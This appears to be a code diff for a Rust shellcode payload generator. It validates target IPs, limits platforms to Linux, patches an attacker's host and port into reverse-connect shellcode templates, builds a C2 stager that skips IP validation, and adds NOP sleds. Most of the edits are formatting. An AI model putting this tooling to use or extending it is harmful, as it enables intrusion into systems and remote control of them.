@@ -14,11 +14,9 @@ impl ConnectionValidator {
     /// Returns Ok(()) if valid, Err(reason) if invalid.
     pub fn validate_ip(ip: &str) -> anyhow::Result<()> {
         let ip_lower = ip.to_lowercase();
-        
+
         // Block localhost
-        let localhost_variants = [
-            "127.0.0.1", "localhost", "::1", "0.0.0.0",
-        ];
+        let localhost_variants = ["127.0.0.1", "localhost", "::1", "0.0.0.0"];
         for variant in &localhost_variants {
             if ip_lower == *variant {
                 anyhow::bail!(
@@ -27,7 +25,7 @@ impl ConnectionValidator {
                 );
             }
         }
-        
+
         // Parse and validate IP address
         match ip.parse::<IpAddr>() {
             Ok(IpAddr::V4(ipv4)) => {
@@ -51,13 +49,13 @@ impl ConnectionValidator {
                 anyhow::bail!("Invalid IP address format: '{}'", ip);
             }
         }
-        
+
         Ok(())
     }
-    
+
     fn is_private_or_reserved_ipv4(ip: &Ipv4Addr) -> bool {
         let octets = ip.octets();
-        
+
         // RFC 1918 Private
         if octets[0] == 10 {
             return true;
@@ -70,12 +68,12 @@ impl ConnectionValidator {
         if octets[0] == 192 && octets[1] == 168 {
             return true;
         }
-        
+
         // RFC 3927 Link-local
         if octets[0] == 169 && octets[1] == 254 {
             return true;
         }
-        
+
         // RFC 5737 Documentation (TEST-NET-1, 2, 3)
         if octets[0] == 192 && octets[1] == 0 && octets[2] == 2 {
             return true;
@@ -86,20 +84,20 @@ impl ConnectionValidator {
         if octets[0] == 203 && octets[1] == 0 && octets[2] == 113 {
             return true;
         }
-        
+
         // RFC 1112 Reserved (former multicast)
         if octets[0] >= 224 && octets[0] <= 239 {
             return true;
         }
-        
+
         // RFC 2544 Benchmarking
         if octets[0] == 198 && octets[1] == 18 {
             return true;
         }
-        
+
         false
     }
-    
+
     fn is_private_or_reserved_ipv6(ip: &Ipv6Addr) -> bool {
         // Loopback ::1
         if ip.is_loopback() {
@@ -171,18 +169,12 @@ impl std::str::FromStr for PayloadType {
 #[derive(Debug, Clone, PartialEq)]
 pub enum Platform {
     Linux,
-    Windows,
-    MacOs,
-    FreeBSD,
 }
 
 impl std::fmt::Display for Platform {
     fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
         match self {
             Platform::Linux => write!(f, "linux"),
-            Platform::Windows => write!(f, "windows"),
-            Platform::MacOs => write!(f, "macos"),
-            Platform::FreeBSD => write!(f, "freebsd"),
         }
     }
 }
@@ -192,10 +184,10 @@ impl std::str::FromStr for Platform {
     fn from_str(s: &str) -> Result<Self, String> {
         match s.to_lowercase().as_str() {
             "linux" | "linux_x64" | "linux_x86_64" => Ok(Platform::Linux),
-            "windows" | "win" | "windows_x64" => Ok(Platform::Windows),
-            "macos" | "osx" | "darwin" | "mac" => Ok(Platform::MacOs),
-            "freebsd" | "bsd" => Ok(Platform::FreeBSD),
-            other => Err(format!("Unknown platform: {}", other)),
+            other => Err(format!(
+                "Unknown platform: {}. Only Linux is supported.",
+                other
+            )),
         }
     }
 }
@@ -341,7 +333,11 @@ impl PayloadGenerator {
     pub fn generate_stager(&self, config: &PayloadConfig) -> anyhow::Result<PayloadOutput> {
         // Get the stager template
         // Note: Stagers often use private IPs for internal C2, skip IP validation
-        let template = crate::stager::generate_stager(&config.lhost, config.lport, crate::templates::STAGER_LINUX_X64);
+        let template = crate::stager::generate_stager(
+            &config.lhost,
+            config.lport,
+            crate::templates::STAGER_LINUX_X64,
+        );
 
         let output = PayloadOutput::new(&template, &config.format, config);
         Ok(output)
@@ -376,7 +372,10 @@ impl PayloadGenerator {
     /// Templates use placeholder markers:
     /// - `0x7f, 0x7f, 0x7f, 0x7f` — IP address placeholder
     /// - `0x7e, 0x7e` — port placeholder (network byte order)
-    fn patch_template(template: &ShellcodeTemplate, config: &PayloadConfig) -> anyhow::Result<Vec<u8>> {
+    fn patch_template(
+        template: &ShellcodeTemplate,
+        config: &PayloadConfig,
+    ) -> anyhow::Result<Vec<u8>> {
         let mut shellcode = template.bytes.clone();
 
         // SECURITY: Validate IP before using it in shellcode
@@ -404,7 +403,9 @@ impl PayloadGenerator {
         }
         let mut bytes = Vec::with_capacity(4);
         for part in parts {
-            let byte: u8 = part.parse().map_err(|_| anyhow::anyhow!("Invalid IP octet: {}", part))?;
+            let byte: u8 = part
+                .parse()
+                .map_err(|_| anyhow::anyhow!("Invalid IP octet: {}", part))?;
             bytes.push(byte);
         }
         Ok(bytes)
@@ -444,14 +445,17 @@ impl PayloadGenerator {
     /// Remove bad characters by re-encoding.
     /// For now, just a simple filter to remove bad bytes.
     fn remove_bad_chars(shellcode: Vec<u8>, bad_chars: &[u8]) -> Vec<u8> {
-        shellcode.into_iter().filter(|b| !bad_chars.contains(b)).collect()
+        shellcode
+            .into_iter()
+            .filter(|b| !bad_chars.contains(b))
+            .collect()
     }
 
     /// Add a NOP sled to the beginning of the shellcode.
     fn add_nop_sled(shellcode: Vec<u8>, size: usize) -> Vec<u8> {
         let mut result = Vec::with_capacity(size + shellcode.len());
         // x86/x64 NOP = 0x90
-        result.extend(std::iter::repeat(0x90).take(size));
+        result.extend(std::iter::repeat_n(0x90, size));
         result.extend(shellcode);
         result
     }
